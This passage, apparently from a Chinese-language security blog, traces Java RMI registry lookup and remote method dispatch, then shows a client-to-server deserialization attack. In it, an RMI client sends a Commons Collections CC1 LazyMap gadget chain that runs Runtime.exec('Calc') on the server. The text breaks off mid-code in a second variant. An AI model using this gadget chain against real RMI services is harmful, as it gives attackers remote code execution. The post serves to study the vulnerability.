alt="image.png"><br>到此为止，注册中心的代理对象就创建完毕了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694518623979-9a0de36a-af1f-4ccd-b054-06c6f7fa9298.png#averageHue=%23131621&clientId=u62ad23c8-79b1-4&from=paste&height=456&id=xNju9&originHeight=911&originWidth=2058&originalType=binary&ratio=2&rotation=0&showTitle=false&size=251671&status=done&style=none&taskId=u5bbf57c3-183e-4510-b0b8-3ad08cf90ed&title=&width=1029" alt="image.png"></p>
<h2 id="客户端通过注册中心代理查找远程对象"><a href="#客户端通过注册中心代理查找远程对象" class="headerlink" title="客户端通过注册中心代理查找远程对象"></a>客户端通过注册中心代理查找远程对象</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694520985613-f470c71f-fae3-4960-9567-fdb3a2144e14.png#averageHue=%2313151d&clientId=u62ad23c8-79b1-4&from=paste&height=358&id=fdAkD&originHeight=716&originWidth=2050&originalType=binary&ratio=2&rotation=0&showTitle=false&size=127162&status=done&style=none&taskId=uc47018f3-2fa4-4164-933a-8801f442523&title=&width=1025" alt="image.png"><br>调用RegistryImpl_Stub#lookup获取查找的远程对象的代理<br>下面这里直接return var23，返回反序列化后的远程对象的代理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694521407090-bafeecea-1440-49de-92c3-6c675de05b25.png#averageHue=%23121422&clientId=u62ad23c8-79b1-4&from=paste&height=635&id=Yns0p&originHeight=1269&originWidth=2071&originalType=binary&ratio=2&rotation=0&showTitle=false&size=310298&status=done&style=none&taskId=uee0a98a5-c8b0-4320-b79e-588cee74c7f&title=&width=1035.5" alt="image.png"></p>
<h2 id="注册中心收到查询请求并返回远程对象的代理"><a href="#注册中心收到查询请求并返回远程对象的代理" class="headerlink" title="注册中心收到查询请求并返回远程对象的代理"></a>注册中心收到查询请求并返回远程对象的代理</h2><p>这里开始涉及C&#x2F;S交互，首先DEBUG起一个RMIServer，断点打在TCPTransport#handleMessages，<br>这个函数专门用于处理请求信息，然后运行RMIClient，由于执行了lookup方法，所以能命中断点开始调试。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694529541440-fe168494-470a-4407-a43c-c92e311bdcf1.png#averageHue=%2313161a&clientId=uc8e5803f-9cef-4&from=paste&height=1119&id=xNZfk&originHeight=1399&originWidth=2000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=356204&status=done&style=none&taskId=uf7e851ef-1ca1-4baf-8048-c2f3651d29b&title=&width=1600" alt="image.png"><br>调用serviceCall进一步处理网络请求信息，最后调用到UnicastServerRef#dispatch<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694530230137-02dce31c-e955-4be8-935d-63cd5d4a4eec.png#averageHue=%2313151a&clientId=uc8e5803f-9cef-4&from=paste&height=1005&id=GiihW&originHeight=1256&originWidth=1950&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=356410&status=done&style=none&taskId=u0d6cbe01-dd18-48fc-b0e4-67c33dbe992&title=&width=1560" alt="image.png"><br>这里套娃调用UnicastServerRef#oldDispatch<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694531032551-7874a1b4-7308-4dcb-b96d-b009c38d0dec.png#averageHue=%2313161a&clientId=uc8e5803f-9cef-4&from=paste&height=854&id=CLklr&originHeight=1068&originWidth=2102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=243411&status=done&style=none&taskId=u4e903a0e-1f35-4e51-aae1-eb400c6da8c&title=&width=1681.6" alt="image.png"><br>再套娃调用skel#dispatch，最终肯定是通过服务端的代理skel来处理网络请求的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694531559917-0d20046a-a039-4d12-940b-6d55b623ee24.png#averageHue=%2313161b&clientId=uc8e5803f-9cef-4&from=paste&height=798&id=SwDUQ&originHeight=997&originWidth=2095&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232278&status=done&style=none&taskId=uda513a11-6afb-4716-bacf-e67be40a908&title=&width=1676" alt="image.png"><br>调用RegistryImpl_Skel#dispatch，获取Client传过来的name，另外新建RegistryImpl，在Server端本地调用RegistryImpl.lookup(name)，获取返回的远程对象，序列化写回网络连接中，传给Client。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694532235455-439a129d-b747-4aac-b7a9-09ecfcf15445.png#averageHue=%2312131c&clientId=uc8e5803f-9cef-4&from=paste&height=985&id=eXhkU&originHeight=1231&originWidth=2155&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=323119&status=done&style=none&taskId=ueebaac16-2dc9-47aa-a6a8-228bcbaa720&title=&width=1724" alt="image.png"></p>
<h2 id="客户端调用远程对象的方法并获取返回结果"><a href="#客户端调用远程对象的方法并获取返回结果" class="headerlink" title="客户端调用远程对象的方法并获取返回结果"></a>客户端调用远程对象的方法并获取返回结果</h2><p>同样涉及C&#x2F;S交互，不过这里DEBUG的是Client，Server正常运行起就行，Client DEBUG启动。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694534301981-07d01ba5-496c-469e-8d01-33e9003fd3f5.png#averageHue=%23131820&clientId=uc8e5803f-9cef-4&from=paste&height=472&id=qzXSY&originHeight=590&originWidth=2047&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=143758&status=done&style=none&taskId=uaec1eb5f-5732-4827-ba8f-c92d4e9fc60&title=&width=1637.6" alt="image.png"><br>Client获取的是远程对象的动态代理stub，它调用任意方法都会走到invoke里<br>三层套娃调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694534399672-e82b8571-2153-4ff1-933a-325a94b7e92e.png#averageHue=%2313161b&clientId=uc8e5803f-9cef-4&from=paste&height=740&id=F8s85&originHeight=925&originWidth=2069&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=215935&status=done&style=none&taskId=ub457750c-18c2-4d97-b0ba-2bbbc36448f&title=&width=1655.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694534459744-4e5f7e18-6bab-44e9-9294-a585115a6c5a.png#averageHue=%2312161d&clientId=uc8e5803f-9cef-4&from=paste&height=512&id=tHKLK&originHeight=640&originWidth=2085&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=114195&status=done&style=none&taskId=u33f2d880-2eb7-4361-8316-3ae0f099c43&title=&width=1668" alt="image.png"><br>最后一层，真正进行C&#x2F;S交互，客户端调用远程对象方法，并且从Server端获取到返回值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694534853484-cc954540-310d-4958-a8af-e6d564cfc060.png#averageHue=%23131418&clientId=uc8e5803f-9cef-4&from=paste&height=804&id=II41b&originHeight=1005&originWidth=1756&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=260705&status=done&style=none&taskId=uf2dc9767-3edb-433c-a633-462cb2fde1f&title=&width=1404.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694535064279-29145086-6172-486b-a9f5-f2b6a5b9cf0d.png#averageHue=%2313151a&clientId=uc8e5803f-9cef-4&from=paste&height=445&id=uGyPl&originHeight=556&originWidth=1571&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=130754&status=done&style=none&taskId=uf7af4879-b515-4928-8c5c-b3c076f1c01&title=&width=1256.8" alt="image.png"><br>至此，Client调用远程对象的方法结束。</p>
<h2 id="服务端接收调用函数请求并返回执行结果"><a href="#服务端接收调用函数请求并返回执行结果" class="headerlink" title="服务端接收调用函数请求并返回执行结果"></a>服务端接收调用函数请求并返回执行结果</h2><p>Server还是断在TCPTransport#handleMessages，DEBUG起Server，正常运行起Client。<br>handleMessages会获取很多请求，像是之前注册中心的lookup，这里多跳几下就能到调用方法的请求了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694535921686-97620b4d-e2f2-46b9-9049-c0dd3d8026da.png#averageHue=%23131519&clientId=uc8e5803f-9cef-4&from=paste&height=676&id=sdHuV&originHeight=845&originWidth=1671&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=189494&status=done&style=none&taskId=u3142eaaa-701a-4f42-989c-35f7f87fe49&title=&width=1336.8" alt="image.png"><br>调用serviceCall进一步处理网络请求信息，最后调用到UnicastServerRef#dispatch<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694536458461-f50b3cb0-bd8b-437a-a465-67afb64aab04.png#averageHue=%23131518&clientId=uc8e5803f-9cef-4&from=paste&height=862&id=aGHJf&originHeight=1077&originWidth=1624&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=243963&status=done&style=none&taskId=ue5cd34d8-0d65-493e-a124-6b37b5dc93f&title=&width=1299.2" alt="image.png"><br>UnicastServerRef#dispatch，真正处理网络请求，并且返回响应的函数。<br>与调用lookup的不同之处如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694536639261-a09d33ea-3a58-49fa-861a-e67bd9f3054c.png#averageHue=%23121419&clientId=uc8e5803f-9cef-4&from=paste&height=650&id=Q0gPp&originHeight=812&originWidth=1316&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117959&status=done&style=none&taskId=u41c09270-0234-4ac0-89ec-681153801a5&title=&width=1052.8" alt="image.png"><br>主要逻辑如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694536992646-24e13872-1a81-405c-a5e9-3169a2b9ba3e.png#averageHue=%23131519&clientId=uc8e5803f-9cef-4&from=paste&height=754&id=Tasfh&originHeight=942&originWidth=1552&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=229234&status=done&style=none&taskId=ue99c3d7c-919b-429b-ad95-d51e4ad53a6&title=&width=1241.6" alt="image.png"><br>至此，服务端完成接受客户端调用（传参）、本地执行函数、返回执行结果这个过程。</p>
<h1 id="RMI的攻击面"><a href="#RMI的攻击面" class="headerlink" title="RMI的攻击面"></a>RMI的攻击面</h1><h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>攻击原理：Client调用远程对象的方法的时候，会把参数序列化传到Server端，Server端会反序例化传进来的参数<br>这里需要Interface里有参数为非基本类型的函数。<br><strong>详情见：服务端接收调用函数请求并返回执行结果</strong><br>下面是客户端和服务端的代码，推荐客户端和服务端放在两个不同的工程下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Override</span></span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1.get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc(getCCPayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先运行Server端启动代码，再运行Client端启动代码，成功执行CC1。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694943666872-cff03be1-432c-42b8-a561-96531272d8a9.png#averageHue=%2371a078&clientId=ueff18163-e590-4&from=paste&height=595&id=u5b6a2a35&originHeight=744&originWidth=1436&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=95082&status=done&style=none&taskId=u4ee3c346-9016-429d-94f4-97175aa70be&title=&width=1148.8" alt="image.png"><br>上面是攻击的是参数为Object类型的漏洞函数，因为基本类型不会走反序列化，是可以成功的。<br>但是要求Server端存在一个参数为Object的函数，攻击面还不够广，于是我们思考，如果Server端的接口里的漏洞函数的参数是自定义的HelloObject类，而服务端接口的参数我们还是传Object，是否能够利用成功？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(Object o) throws RemoteException;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Override</span></span><br><span class="line">    <span class="comment">// public void vulFunc(Object o) throws RemoteException &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1.get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc(getCCPayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> 